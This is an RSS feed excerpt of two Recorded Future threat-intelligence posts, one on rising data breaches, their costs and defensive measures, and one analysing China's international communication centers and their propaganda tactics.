            <content:encoded><![CDATA[<p>Recorded Futures Insikt Group identified a 76% increase in publicly reported data breaches from 2022 to 2023. While 2024 data is not yet complete, Recorded Future data on validated data breaches project a further 5% increase in 2024 compared to 2023. The scale of this increase in the past two years invites a sense of urgency and concern, especially when the attack surface for data breaches is moving further out of companies control. Based on what we can measure, the costliest impacts of data breaches in the last several years have been operational disruption, legal risks, and declining sales due to churn and loss of customer trust. However, the real risk lies in companies falling behind in their security strategy and failing to adopt a new way of thinking. Our immediate and long-term solutions provide a starting point for effectively addressing this escalating threat. </p><h2 id="data-breaches-are-on-the-rise">Data Breaches Are on the Rise</h2><ul><li>The industries most affected by the 76% increase in data breaches in 2023 were the healthcare, finance, information technology and software, insurance, and manufacturing sectors.</li><li>The insurance sector saw the largest increase in reported data breaches in 2023, with a 178% increase. This was followed by healthcare with a 107% increase and manufacturing with an 81% increase. The sensitivity of these industries data and the cost of disruption to their operations have likely been driving factors for threat actors to target these industries.</li></ul><p><img src="https://cms.recordedfuture.com/uploads/data_breaches_chart_b8e601b5a0.png" alt="Figure 1: Publicly reported data breaches in the top five affected industries In 2022 compared to 2023 (Source: Recorded Future)"><em>Figure 1: Publicly reported data breaches in the top five affected industries In 2022 compared to 2023 (Source: Recorded <a href="https://app.recordedfuture.com/live/sc/1ObI7GMg9WD3">Future</a>)</em></p><h2 id="the-costs-of-data-breaches-continue-to-be-high">The Costs of Data Breaches Continue to be High</h2><ul><li>Research from <a href="https://www.ibm.com/reports/data-breach">IBM shows</a> that the average total cost of a data breach reached an all-time high in 2024 of USD 4.88 million. </li><li>The business impacts of data breaches are often easiest to measure right after a breach is detected, such as the four-day outage at an Australian personal loan provider in early 2023 that <a href="https://investors.latitudefinancial.com.au/DownloadFile.axd?file=/Report/ComNews/20230316/02644401.pdf">resulted</a> in what we estimate could have been a revenue disruption of over $6 million USD while security teams mitigated the breach. </li><li>However, impacts can also linger: In Q4 of 2023, after a US genetics testing company confirmed it had been hit by a major data breach, it saw <a href="https://investors.23andme.com/news-releases/news-release-details/23andme-reports-fy2023-fourth-quarter-and-full-year-financial">decreased sales</a> and <a href="https://www.google.com/finance/quote/.IXIC:INDEXNASDAQ?window=1Y&comparison=NASDAQ%3AME">underperformed</a> the Nasdaq by approximately 16%. While it was not the only factor at play, the negative media coverage around the data breach is highly likely to have played a role in stock, sales, and revenue underperformance, especially when considered in the context of the <a href="https://connect.sustainalytics.com/hubfs/INV/Thought%20Leadership/Sustainalytics_The%20Impact%20of%20Cyberattacks%20on%20Stock%20Prices_Sep%202022.pdf">extensive</a> <a href="https://www.ibm.com/reports/data-breach">literature indicating</a> how cyberattacks can negatively impact stock prices.</li></ul><h2 id="the-causes-are-moving-further-out-of-control">The Causes Are Moving Further Out Of Control</h2><ul><li>As the costs of a data breach increase, the causes of breaches are also moving further out of organizations control. Companies may have robust vulnerability remediation on their infrastructure and devices, but threat actors are increasingly looking for vulnerabilities in third-party software to gain access to more potential victims1. Third-party software providers are critical components of the software supply chain and may not have effectively identified or addressed these vulnerabilities. This lack of remediation exposes the entire ecosystem to heightened risks of compromise, as reliance on <a href="https://www.recordedfuture.com/outcomes/supply-chain">third-party software expands the attack surface</a>.</li><li>As more and more data is likely hosted on third-party cloud providers, threat actors are abusing exposed administrative accounts (<a href="https://attack.mitre.org/techniques/T1078/">Valid Accounts</a>) to gain privileged access and exfiltrate data more effectively.  Recorded Futures 2023 Annual Report <a href="https://www.recordedfuture.com/research/2023-annual-report">highlighted</a> a 22% increase in validated cyberattacks leveraging the Valid Accounts technique. Based on initial analysis of 2024 data, threat actors continue to abuse valid accounts at various stages of an attack sequencesuch as discovery, privilege escalation, and defense evasionto facilitate data theft. These accounts enable lateral movement within networks to access sensitive systems, facilitate reconnaissance by appearing as normal user activity, and help blend into regular traffic to avoid triggering security alerts.</li></ul><h2 id="getting-ahead-of-the-problem">Getting Ahead of the Problem</h2><p>One immediate action security teams can take to improve their organizations risk profile is to create a vendor catalog to identify all external parties with access to company data. Use of risk management software, such as Recorded Futures <a href="https://go.recordedfuture.com/hubfs/data-sheets/third-party-intelligence.pdf">Third-Party Intelligence Module</a>, enables extended visibility across the entire third-party ecosystem to uncover risk exposures and prioritize risk mitigation. </p><p>More long-term actions can also be helpful in mitigating the chances or severity of a data breach: </p><ul><li><a href="https://www.immuta.com/blog/what-is-data-tokenization/">Tokenization</a> or encryption helps to render sensitive data meaningless or inaccessible, respectively, outside of a secure environment. Organizations can reduce exposure to risks associated with storing sensitive data and maintain compliance with data privacy laws and regulations by implementing the appropriate method. An audit of necessary tasks associated with data, and not just the sensitivity of data itself, can help with applying the principle of least privilege effectively. </li><li>Close collaboration between multiple teams   forensics, incident response, and legal and compliance  can more successfully manage the fallout from potential data breaches. If these teams do not already have a good working relationship, chances are low that they will automatically have one in response to a severe and public data breach. As a result, it is a good idea for these teams to know each other well outside of a crisis.</li></ul><p>1 Sources: H1 2024: <a href="https://go.recordedfuture.com/hubfs/reports/cta-2024-0910.pdf">Malware and Vulnerability Trends Report</a>, <a href="https://www.recordedfuture.com/blog/enhanced-ransomware-solution-announcement">Recorded Future Ransomware Solution</a>, <a href="https://www.verizon.com/business/resources/reports/dbir/2024/results-and-analysis-intro/">Verizon 2024 Results and Analysis</a></p>]]></content:encoded>

            <description><![CDATA[China's ICCs reshape global propaganda via targeted messaging, social media, and influence networks to amplify the Communist Party's voice globally.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt-group-logo-updated-3-300x48.png"></p><h2 id="summary">Summary</h2><p>China is rapidly advancing its global propaganda strategies through international communication centers (ICCs), with over 100 centers established since 2018  most since 2023. These centers aim to amplify the Chinese Communist Party&#39;s (CCP) voice on the international stage, <a href="https://www.recordedfuture.com/blog/elephants-street-dance-chinese-communist-party-appeal-youth-overseas-propaganda">targeting specific audiences</a> with tailored messaging (a strategy known as precise communication). ICCs coordinate local, national, and international resources to build China&#39;s image, share political narratives, and promote economic partnerships.</p><p>By leveraging inauthentic social media amplification, foreign influencers, and collaborations with overseas media, ICCs advance <a href="https://www.recordedfuture.com/research/china-propaganda-targets-bbc-uk">Chinas multi-layered propaganda</a> approach. For instance, Fujian&#39;s ICC reportedly manages TikTok accounts targeting Taiwanese audiences, likely including a covert account that is highly critical of the Taiwan government called Two Tea Eggs. On YouTube, the same ICC promotes videos of Taiwanese individuals praising China. These centers are strategically positioned to promote China&#39;s interests during geopolitical crises, despite challenges like limited credibility and resource constraints.</p><h2 id="breaking-the-circle-chinese-communist-party-propaganda-infrastructure-rapidly-expands">Breaking the Circle: Chinese Communist Party Propaganda Infrastructure Rapidly Expands</h2><p><a href="https://www.recordedfuture.com/blog/chinas-narrative-war-democracy">China&#39;s efforts to reshape global narratives</a> about its policies, culture, and geopolitical aims have reached new heights with the rapid proliferation of international communication centers (ICCs). Established to amplify the voice of the Chinese Communist Party (CCP), these centers are integral to <a href="https://www.recordedfuture.com/research/1-key-for-1-lock-chinese-communist-party-strategy-targeted-propaganda">China&#39;s global propaganda apparatus</a> and seek to propel the CCPs precise communication strategy for targeting distinct audiences. Heres a closer look at their functions, strategies, and implications.</p><h2 id="what-are-iccs">What Are ICCs?</h2><p>ICCs are propaganda hubs designed to bring new resources to the CCPs efforts to tell Chinas story by centralizing and streamlining the capabilities of provinces, cities, and smaller jurisdictions. These centers focus on building China&#39;s global image by sharing positive narratives about its culture, economy, and development. Simultaneously, they act as a conduit for political narratives aimed at countering negative perceptions and promoting China&#39;s geopolitical agenda.</p><p>Over 100 ICCs have been established across China, primarily since 2023, under provincial and sub-provincial propaganda departments and state media organizations. These centers aim to &quot;break the circle&quot; to penetrate foreign audiences and tailoring content for specific regions and demographics.</p><h2 id="key-objectives-of-iccs">Key Objectives of ICCs</h2><p>ICCs primarily aim to promote positive narratives about China. They create content that highlights the countrys cultural heritage, technological innovations, and economic progress, fostering goodwill among international audiences. Additionally, ICCs counter negative narratives by responding to perceived anti-China sentiments and disseminating content to influence public opinion on geopolitical topics. By tailoring their approaches to specific regions and demographics, ICCs strive to ensure their narratives resonate more effectively. For example, Fujians ICC specifically targets Taiwanese audiences using TikTok accounts that blend cultural themes with critical political messaging.</p><h2 id="tactics-and-strategies">Tactics and Strategies</h2><p>ICCs employ various tactics to achieve their objectives. <a href="https://www.recordedfuture.com/research/china-social-media-operations">Social media operations form a core component of their strategy</a>, with thousands of accounts active across platforms like Facebook, YouTube, and TikTok. Many of these accounts lack transparency about their state affiliations, enabling covert influence campaigns. Additionally, ICCs leverage foreign influencers and communication officers to amplify Chinas narratives through user-generated content, vlogs, and experiential propaganda.</p><p>Collaboration with overseas media organizations further enhances ICCs&#39; reach and legitimacy. Through actions like organizing foreign journalist visits to China, ICCs create an impression of organic coverage and offer an alternative to Western narratives. These partnerships  reportedly established in Australia, Brazil, Cambodia, Egypt, France, Japan, Russia, the United States, and elsewhere  are complemented by localized propaganda activities that align with Chinas economic and geopolitical interests. S</p><h2 id="challenges-to-success">Challenges to Success</h2><p>Despite ambitious goals, ICCs face significant challenges that hinder their effectiveness. These include a lack of professional and foreign talent, insufficient discourse power, inadequate data for precise communication, and inconsistent funding. ICCs often struggle to translate local developments into effective narratives for foreign audiences and lack focus on target demographics. Many rely heavily on central state media infrastructure, as seen with the Nanning International Communication Center outsourcing key operations to Xinhua News Agency. These limitations echo long-standing issues within China&#39;s state media sector.</p><h2 id="implications">Implications</h2><p>ICCs represent a sophisticated evolution in China&#39;s propaganda efforts. While they are unlikely to become trusted sources of information in the near term, their ability to amplify preferred narratives during geopolitical crises is likely significant. These centers likely have the potential to influence foreign opinion of China by offering regular engagement, providing alternatives to Western sources, and focusing on topics like quality of life in China rather than political values, especially among Global South and Western periphery audiences.</p><h2 id="outlook">Outlook</h2><p>The expansion of international communication centers (ICCs) reflects China&#39;s ongoing efforts to innovate its media strategy, centralize resources, and project global narratives favoring its interests under Xi Jinping&#39;s leadership. Despite challenges, ICCs likely strengthen China&#39;s ability to influence global discourse by leveraging thousands of overt and covert social media accounts and fostering collaborations with foreign media. These centers could amplify assertive messaging during crises and suppress negative coverage of China.</p><p>China&#39;s long-term goal is almost certainly to establish ICC-affiliated platforms as trusted sources of information. While this remains unlikely in the near term due to credibility challenges, ICCs represent a strategic step toward improving Chinas external propaganda system. Researchers and governments should prioritize tracking ICC activities and advocating for transparent labeling of their state affiliations on social media platforms.</p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/ta-cn-2024-1210.pdf">click here</a> to download the report as a PDF.</p>]]></content:encoded>
